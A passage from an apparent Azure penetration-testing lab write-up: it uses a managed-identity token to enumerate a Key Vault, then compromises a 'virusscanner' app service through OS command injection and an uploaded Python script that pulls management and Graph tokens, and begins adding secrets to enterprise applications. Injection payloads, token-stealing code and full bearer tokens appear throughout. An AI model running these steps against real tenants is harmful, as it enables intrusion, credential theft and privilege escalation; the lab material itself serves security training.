Purchase link has been sent to (b{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYxOTgyMjkwNywibmJmIjoxNjE5ODIyOTA3LCJleHAiOjE2MTk5MDk2MDcsImFpbyI6IkUyWUFncllUTE16ZEtXTGhEc2xNZ2JPVjB3RT0iLCJhcHBpZCI6IjJlOTFhNGZlLWEwZjItNDZlZS04MjE0LWZhMmZmNmFhOWFiYyIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJvaWQiOiIzMGU2NzcyNy1hOGI4LTQ4ZDktODMwMy1mMjQ2OWRmOTdjYjIiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dHY2a2tTN3lvTzVHZ2hUNkxfYXFtcnh3QUFBLiIsInN1YiI6IjMwZTY3NzI3LWE4YjgtNDhkOS04MzAzLWYyNDY5ZGY5N2NiMiIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInV0aSI6IkFBMzE5bU9wNVVla2UxY2h5UDRCQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy9iNDEzODI2Zi0xMDhkLTQwNDktOGMxMS1kNTJkNWQzODg3NjgvcmVzb3VyY2Vncm91cHMvUmVzZWFyY2gvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvdmF1bHRmcm9udGVuZCIsInhtc190Y2R0IjoiMTYxNTM3NTYyOSJ9.k3y4JOJ2x78phVyLbg4vjPD5Hc2huoV-fFHu6u8FIAZN2NcZ6Xg3O1IMJtQDG26Tzm2gPc3dlA-zetsVQCBfCN9glUzOUWponvo54xBX6pJvqBD7sf_DGDIC1Hqs6xXkG4hJJ5hRJDqf8cp4cetO4EZlzbWEu3o5RNIKILUpISs6_I0TI7U1GDmqY1euETs1nDQpnaVSTUEai7OGtddnCPtAJHO8vdW_DgIxRXI8FJJfceDLrbp_ed6tURbJiLPSDT8MoJvTgRM7_kkqtgqTKKjP-XUlDUq--lSmCPOJxySGfksq3dafH39Ay7fdtZk-sf-ruFWsIhnxDF0zL4EKhA","expires_on":"05/01/2021 22:53:26 +00:00","resource":"https://management.azure.com","token_type":"Bearer","client_id":"2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc"}, None)
```

Access token:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYxOTgyMjkwNywibmJmIjoxNjE5ODIyOTA3LCJleHAiOjE2MTk5MDk2MDcsImFpbyI6IkUyWUFncllUTE16ZEtXTGhEc2xNZ2JPVjB3RT0iLCJhcHBpZCI6IjJlOTFhNGZlLWEwZjItNDZlZS04MjE0LWZhMmZmNmFhOWFiYyIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJvaWQiOiIzMGU2NzcyNy1hOGI4LTQ4ZDktODMwMy1mMjQ2OWRmOTdjYjIiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dHY2a2tTN3lvTzVHZ2hUNkxfYXFtcnh3QUFBLiIsInN1YiI6IjMwZTY3NzI3LWE4YjgtNDhkOS04MzAzLWYyNDY5ZGY5N2NiMiIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInV0aSI6IkFBMzE5bU9wNVVla2UxY2h5UDRCQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy9iNDEzODI2Zi0xMDhkLTQwNDktOGMxMS1kNTJkNWQzODg3NjgvcmVzb3VyY2Vncm91cHMvUmVzZWFyY2gvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvdmF1bHRmcm9udGVuZCIsInhtc190Y2R0IjoiMTYxNTM3NTYyOSJ9.k3y4JOJ2x78phVyLbg4vjPD5Hc2huoV-fFHu6u8FIAZN2NcZ6Xg3O1IMJtQDG26Tzm2gPc3dlA-zetsVQCBfCN9glUzOUWponvo54xBX6pJvqBD7sf_DGDIC1Hqs6xXkG4hJJ5hRJDqf8cp4cetO4EZlzbWEu3o5RNIKILUpISs6_I0TI7U1GDmqY1euETs1nDQpnaVSTUEai7OGtddnCPtAJHO8vdW_DgIxRXI8FJJfceDLrbp_ed6tURbJiLPSDT8MoJvTgRM7_kkqtgqTKKjP-XUlDUq--lSmCPOJxySGfksq3dafH39Ay7fdtZk-sf-ruFWsIhnxDF0zL4EKhA
```

Client ID:  `2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc`

<br/>

Then use Az PowerShell to find the accessible resources:

```
$token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYxOTgyMjkwNywibmJmIjoxNjE5ODIyOTA3LCJleHAiOjE2MTk5MDk2MDcsImFpbyI6IkUyWUFncllUTE16ZEtXTGhEc2xNZ2JPVjB3RT0iLCJhcHBpZCI6IjJlOTFhNGZlLWEwZjItNDZlZS04MjE0LWZhMmZmNmFhOWFiYyIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJvaWQiOiIzMGU2NzcyNy1hOGI4LTQ4ZDktODMwMy1mMjQ2OWRmOTdjYjIiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dHY2a2tTN3lvTzVHZ2hUNkxfYXFtcnh3QUFBLiIsInN1YiI6IjMwZTY3NzI3LWE4YjgtNDhkOS04MzAzLWYyNDY5ZGY5N2NiMiIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInV0aSI6IkFBMzE5bU9wNVVla2UxY2h5UDRCQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy9iNDEzODI2Zi0xMDhkLTQwNDktOGMxMS1kNTJkNWQzODg3NjgvcmVzb3VyY2Vncm91cHMvUmVzZWFyY2gvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvdmF1bHRmcm9udGVuZCIsInhtc190Y2R0IjoiMTYxNTM3NTYyOSJ9.k3y4JOJ2x78phVyLbg4vjPD5Hc2huoV-fFHu6u8FIAZN2NcZ6Xg3O1IMJtQDG26Tzm2gPc3dlA-zetsVQCBfCN9glUzOUWponvo54xBX6pJvqBD7sf_DGDIC1Hqs6xXkG4hJJ5hRJDqf8cp4cetO4EZlzbWEu3o5RNIKILUpISs6_I0TI7U1GDmqY1euETs1nDQpnaVSTUEai7OGtddnCPtAJHO8vdW_DgIxRXI8FJJfceDLrbp_ed6tURbJiLPSDT8MoJvTgRM7_kkqtgqTKKjP-XUlDUq--lSmCPOJxySGfksq3dafH39Ay7fdtZk-sf-ruFWsIhnxDF0zL4EKhA'
$clientid = '2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc'

Connect-AzAccount -AccessToken $token -AccountId $clientid; Get-AzResource | fl Name, ResourceGroupName, ResourceType, ResourceId
```

![picture 44](images/b30093c23f067817b2777cdb0f105c657814401dcb97803739498e681f025653.png)  

```
Name              : ResearchKeyVault
ResourceGroupName : Research
ResourceType      : Microsoft.KeyVault/vaults
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.KeyVault/vaults/ResearchKeyVault
```

<br/>

Check the permission:

```
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.KeyVault/vaults/ResearchKeyVault/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'

$RequestParams = @{ 
    Method = 'GET' 
    Uri = $URI
    Headers = @{ 
        'Authorization' = "Bearer $Token"
    }
} 

(Invoke-RestMethod @RequestParams).value
```

![picture 45](images/62e7069d1fdf2743e0a8b1ad98012b5b14e2830818b3eaa45fdc9445442eb621.png)  

- `*/read`

<br/>

---

## Objective 12:  App Service Abuse - Insecured File Upload, OS Command Injection

**Question**

1. An application in the defcorphq tenant (https://virusscanner.azurewebsites.net) is vulnerable to insecure file upload and OS command injection. Compromise the app service.
2. Check if the service principal for the managed identity of the compromised application has any interesting permissions on other Azure resources.

<br/>

**Answer**

Browse https://virusscanner.azurewebsites.net:

![picture 46](images/818061ce32f34fceb4d669bc9758e88ed7111c967d4de6ec892e2ba62380b8fb.png)  

<br/>

It allows file upload and there is an input field below.

Try to simply use the payload `; env | grep IDENTITY;` in the input field:

![picture 47](images/ae1f65318e8c688b835a6a843b94514ea0621ae2dbcf1a255da72acf310b56eb.png)  

- IDENTITY_HEADER=72CFC294F45C4F478D46C9DDFA27CDD8
- IDENTITY_ENDPOINT=http://localhost:8081/msi/token

This is a signature of using managed identity.

<br/>

Then we can use `curl` to get an access token:

```
; curl "http://localhost:8081/msi/token?resource=https://management.azure.com&api-version=2017-09-01" -H "secret:72CFC294F45C4F478D46C9DDFA27CDD8";
```

However, there is nothing shown on the screen.

<br/>

Try to upload a Python script (in Zip) for doing that:

```
import os
import json

IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
IDENTITY_HEADER = os.environ['IDENTITY_HEADER']

cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)

val = os.popen(cmd).read()

print("[+] Management API")
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID: "+json.loads(val)["client_id"])

cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)

val = os.popen(cmd).read()
print("\r\n[+] Graph API")
print(json.loads(val)["access_token"])
print("ClientID: "+json.loads(val)["client_id"])
```

![picture 48](images/ba32bf5990b5680d96b83002f5f45093e01f0c94e0a42620905df2b563886937.png)  

<br/>

Check the `/tmp` directory:

```
; ls/tmp;
```

![picture 49](images/ec702490a6a362423237eedcb2c367c8efdda8e075431c013b1c7635419caf93.png)  


Keep digging in:

```
; ls /tmp/uploads/student190;
```

![picture 50](images/6402bda4f3cf7e494c5c12bd3661923721d63a51a4c1ef50c42441fb3b23fff7.png)  

Here is our python script.

<br/>

Leverage OS command execution to run the python script:

```
; python3 /tmp/uploads/student190/student190.py;
```

![picture 51](images/c93127c327828c9eb270493270a8df4b9793b80c2bfc98886afcc363a28a0a22.png)  

```
Status: [+] Management API
Access Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2MTk4OTEwMjgsIm5iZiI6MTYxOTg5MTAyOCwiZXhwIjoxNjE5OTc3NzI4LCJhaW8iOiJFMlpnWU1neE1KUmNOTjlRcG1UUDFzN0w4bE5NQUE9PSIsImFwcGlkIjoiNjJlNDQ0MjYtNWM0Ni00ZTNjLThhODktZjQ2MWQ1ZDU4NmYyIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsIm9pZCI6ImVhNGMzYzE3LThhNWQtNGUxZi05NTc3LWIyOWRmZmYwNzMwYyIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0aVpFNUdKR1hEeE9pb24wWWRYVmh2SndBQUEuIiwic3ViIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiMXZ6bnV2VlZyRWFtLWx0V2x4WU5BZyIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2I0MTM4MjZmLTEwOGQtNDA0OS04YzExLWQ1MmQ1ZDM4ODc2OC9yZXNvdXJjZWdyb3Vwcy9JVC9wcm92aWRlcnMvTWljcm9zb2Z0LldlYi9zaXRlcy9wcm9jZXNzZmlsZSIsInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.C2PkDFAbCKzGalALIYkop8DUbtYYkjtm_0vR7_gZ0vZ0ZDQogDGth8e0J9GLyt9PceQ96M3MIj5zGSH7sGMp5j2cmYcZKcUlcb9I0fGeeT943cAQrv7y9B6TuB7bD6iQXzC7krtTHDUrRIP3XcUVB_gy7Ox6VFCxl6pRp8MaK7p9zVFbpYlstz_5TV9wv46fW3HPEQ3q0XWQufgRUOL4vY66FmrpP-vuJUzoDH8fMhXlZRoUcGa47LfiluS7oA-RDZalqnIuv_CbXndqCtrPuKY2L5DTVyRkRR17GvTSTdXlL0eAl3oNgQyLU40F2J2n5kdg1m7AxzdMGgWIL3Nw4w
ClientID: 62e44426-5c46-4e3c-8a89-f461d5d586f2

[+] Graph API
eyJ0eXAiOiJKV1QiLCJub25jZSI6IkplRmQwdGxuMXQyYkZkaVEyU1pOVlpzODRNMlVaeHQ0ejRoWkpOREdZQmMiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYxOTg5MTAzMCwibmJmIjoxNjE5ODkxMDMwLCJleHAiOjE2MTk5Nzc3MzAsImFpbyI6IkUyWmdZSkJaeExaZDU1Z1F6NjJ6L1hyZmx0ZnpBZ0E9IiwiYXBwX2Rpc3BsYXluYW1lIjoicHJvY2Vzc2ZpbGUiLCJhcHBpZCI6IjYyZTQ0NDI2LTVjNDYtNGUzYy04YTg5LWY0NjFkNWQ1ODZmMiIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpZHR5cCI6ImFwcCIsIm9pZCI6ImVhNGMzYzE3LThhNWQtNGUxZi05NTc3LWIyOWRmZmYwNzMwYyIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0aVpFNUdKR1hEeE9pb24wWWRYVmh2SndBQUEuIiwic3ViIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwidGVuYW50X3JlZ2lvbl9zY29wZSI6IkFTIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiYm9LRWRxUllURVdWZEN2dE05NDBBZyIsInZlciI6IjEuMCIsInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.UWTseJSiX51PWZ7AoxC6m4brLDmuuVxe4Oc8RB_NIQABFnUqbNFk3SQmZCOc04W5KNyxzO4vgD9fs-65C8QXwWm5oERo4e-zWRQIdAfqQol7YSgqSH9cNIIG8Ot-AeHg6Y2IiQ8v9Xk2FXTseVzk78BztoQd0LeqVt9N9AvkVUk69C2bQ355zEbu5eKU9kO04cQ9sBUZIdscHMcMmtKGzVb1Pul4b-QvnVcxlyEaLcW0-ANIkMsXx5mH_X1r3UJtvqJ_Fqeil5TUCja94tUCYbUJAxNER4FfcBWvJ5xbjvYouPpFiyzXi8nN_EUV5i82DxkcBKG_2tQXCgpMSNtfVw
ClientID: 62e44426-5c46-4e3c-8a89-f461d5d586f2
```

<br/>

Then we can use the tokens to check the Az resources:

**Management API**

```
$token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2MTk4OTEwMjgsIm5iZiI6MTYxOTg5MTAyOCwiZXhwIjoxNjE5OTc3NzI4LCJhaW8iOiJFMlpnWU1neE1KUmNOTjlRcG1UUDFzN0w4bE5NQUE9PSIsImFwcGlkIjoiNjJlNDQ0MjYtNWM0Ni00ZTNjLThhODktZjQ2MWQ1ZDU4NmYyIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsIm9pZCI6ImVhNGMzYzE3LThhNWQtNGUxZi05NTc3LWIyOWRmZmYwNzMwYyIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0aVpFNUdKR1hEeE9pb24wWWRYVmh2SndBQUEuIiwic3ViIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiMXZ6bnV2VlZyRWFtLWx0V2x4WU5BZyIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2I0MTM4MjZmLTEwOGQtNDA0OS04YzExLWQ1MmQ1ZDM4ODc2OC9yZXNvdXJjZWdyb3Vwcy9JVC9wcm92aWRlcnMvTWljcm9zb2Z0LldlYi9zaXRlcy9wcm9jZXNzZmlsZSIsInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.C2PkDFAbCKzGalALIYkop8DUbtYYkjtm_0vR7_gZ0vZ0ZDQogDGth8e0J9GLyt9PceQ96M3MIj5zGSH7sGMp5j2cmYcZKcUlcb9I0fGeeT943cAQrv7y9B6TuB7bD6iQXzC7krtTHDUrRIP3XcUVB_gy7Ox6VFCxl6pRp8MaK7p9zVFbpYlstz_5TV9wv46fW3HPEQ3q0XWQufgRUOL4vY66FmrpP-vuJUzoDH8fMhXlZRoUcGa47LfiluS7oA-RDZalqnIuv_CbXndqCtrPuKY2L5DTVyRkRR17GvTSTdXlL0eAl3oNgQyLU40F2J2n5kdg1m7AxzdMGgWIL3Nw4w'
$graphaccesstoken = 'eyJ0eXAiOiJKV1QiLCJub25jZSI6IkplRmQwdGxuMXQyYkZkaVEyU1pOVlpzODRNMlVaeHQ0ejRoWkpOREdZQmMiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYxOTg5MTAzMCwibmJmIjoxNjE5ODkxMDMwLCJleHAiOjE2MTk5Nzc3MzAsImFpbyI6IkUyWmdZSkJaeExaZDU1Z1F6NjJ6L1hyZmx0ZnpBZ0E9IiwiYXBwX2Rpc3BsYXluYW1lIjoicHJvY2Vzc2ZpbGUiLCJhcHBpZCI6IjYyZTQ0NDI2LTVjNDYtNGUzYy04YTg5LWY0NjFkNWQ1ODZmMiIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpZHR5cCI6ImFwcCIsIm9pZCI6ImVhNGMzYzE3LThhNWQtNGUxZi05NTc3LWIyOWRmZmYwNzMwYyIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0aVpFNUdKR1hEeE9pb24wWWRYVmh2SndBQUEuIiwic3ViIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwidGVuYW50X3JlZ2lvbl9zY29wZSI6IkFTIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiYm9LRWRxUllURVdWZEN2dE05NDBBZyIsInZlciI6IjEuMCIsInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.UWTseJSiX51PWZ7AoxC6m4brLDmuuVxe4Oc8RB_NIQABFnUqbNFk3SQmZCOc04W5KNyxzO4vgD9fs-65C8QXwWm5oERo4e-zWRQIdAfqQol7YSgqSH9cNIIG8Ot-AeHg6Y2IiQ8v9Xk2FXTseVzk78BztoQd0LeqVt9N9AvkVUk69C2bQ355zEbu5eKU9kO04cQ9sBUZIdscHMcMmtKGzVb1Pul4b-QvnVcxlyEaLcW0-ANIkMsXx5mH_X1r3UJtvqJ_Fqeil5TUCja94tUCYbUJAxNER4FfcBWvJ5xbjvYouPpFiyzXi8nN_EUV5i82DxkcBKG_2tQXCgpMSNtfVw'
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId 62e44426-5c46-4e3c-8a89-f461d5d586f2
```

![picture 52](images/463c5050d46b61c733785324ac2684049d80978f0d6af5002b63a8dc9bc3cbaa.png)  

<br/>

Then list the resources:

```
Get-AzResource
```

![picture 53](images/3c2f9e0b4fc0276a84e8bf6ed5f9db380f19030abd0acc65cf4b9bbd20a2421b.png)  

This error means the managed identity has no rights on any of the Azure resources.

<br/>

Then use the Graph API token with the REST API to list all Enterprise Application in the `defcorphq` tenant:

```
$token = 'eyJ0eXAiOiJKV1QiLCJub25jZSI6IkplRmQwdGxuMXQyYkZkaVEyU1pOVlpzODRNMlVaeHQ0ejRoWkpOREdZQmMiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYxOTg5MTAzMCwibmJmIjoxNjE5ODkxMDMwLCJleHAiOjE2MTk5Nzc3MzAsImFpbyI6IkUyWmdZSkJaeExaZDU1Z1F6NjJ6L1hyZmx0ZnpBZ0E9IiwiYXBwX2Rpc3BsYXluYW1lIjoicHJvY2Vzc2ZpbGUiLCJhcHBpZCI6IjYyZTQ0NDI2LTVjNDYtNGUzYy04YTg5LWY0NjFkNWQ1ODZmMiIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpZHR5cCI6ImFwcCIsIm9pZCI6ImVhNGMzYzE3LThhNWQtNGUxZi05NTc3LWIyOWRmZmYwNzMwYyIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0aVpFNUdKR1hEeE9pb24wWWRYVmh2SndBQUEuIiwic3ViIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwidGVuYW50X3JlZ2lvbl9zY29wZSI6IkFTIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiYm9LRWRxUllURVdWZEN2dE05NDBBZyIsInZlciI6IjEuMCIsInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.UWTseJSiX51PWZ7AoxC6m4brLDmuuVxe4Oc8RB_NIQABFnUqbNFk3SQmZCOc04W5KNyxzO4vgD9fs-65C8QXwWm5oERo4e-zWRQIdAfqQol7YSgqSH9cNIIG8Ot-AeHg6Y2IiQ8v9Xk2FXTseVzk78BztoQd0LeqVt9N9AvkVUk69C2bQ355zEbu5eKU9kO04cQ9sBUZIdscHMcMmtKGzVb1Pul4b-QvnVcxlyEaLcW0-ANIkMsXx5mH_X1r3UJtvqJ_Fqeil5TUCja94tUCYbUJAxNER4FfcBWvJ5xbjvYouPpFiyzXi8nN_EUV5i82DxkcBKG_2tQXCgpMSNtfVw'
$uri = 'https://graph.microsoft.com/v1.0/applications'
$requestparams = @{
  Method = 'GET'
  Uri    = $uri
  Headers = @{
    'Authorization' = "Bearer $token"
  }
}
(Invoke-RestMethod @requestparams).value
```

![picture 54](images/0c884a17280858fb7bf1abd91e5faf688f915beb85e835d23999040f398a3f72.png)  

<br/>

To check if we can abuse any of the Enterprise Aplpications (service principal), we can try to add credential to the above.
- https://graph.microsoft.com/v1.0/servicePrincipals/{ID}/appRoleAssignments

<br/>

Use `Add-AzADAppSecret.ps1` to try to add a secret (app password) to all the enterprise applications and shows the successful ones:

```
$graphtoken = 'eyJ0eXAiOiJKV1QiLCJub25jZSI6IkplRmQwdGxuMXQyYkZkaVEyU1pOVlpzODRNMlVaeHQ0ejRoWkpOREdZQmMiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYxOTg5MTAzMCwibmJmIjoxNjE5ODkxMDMwLCJleHAiOjE2MTk5Nzc3MzAsImFpbyI6IkUyWmdZSkJaeExaZDU1Z1F6NjJ6L1hyZmx0ZnpBZ0E9IiwiYXBwX2Rpc3BsYXluYW1lIjoicHJvY2Vzc2ZpbGUiLCJhcHBpZCI6IjYyZTQ0NDI2LTVjNDYtNGUzYy04YTg5LWY0NjFkNWQ1ODZmMiIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpZHR5cCI6ImFwcCIsIm9pZCI6ImVhNGMzYzE3LThhNWQtNGUxZi05NTc3LWIyOWRmZmYwNzMwYyIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0aVpFNUdKR1hEeE9pb24wWWRYVmh2SndBQUEuIiwic3ViIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwidGVuYW50X3JlZ2lvbl9zY29wZSI6IkFTIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiYm9LRWRxUllURVdWZEN2dE05NDBBZyIsInZlciI6IjEuMCIsInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.UWT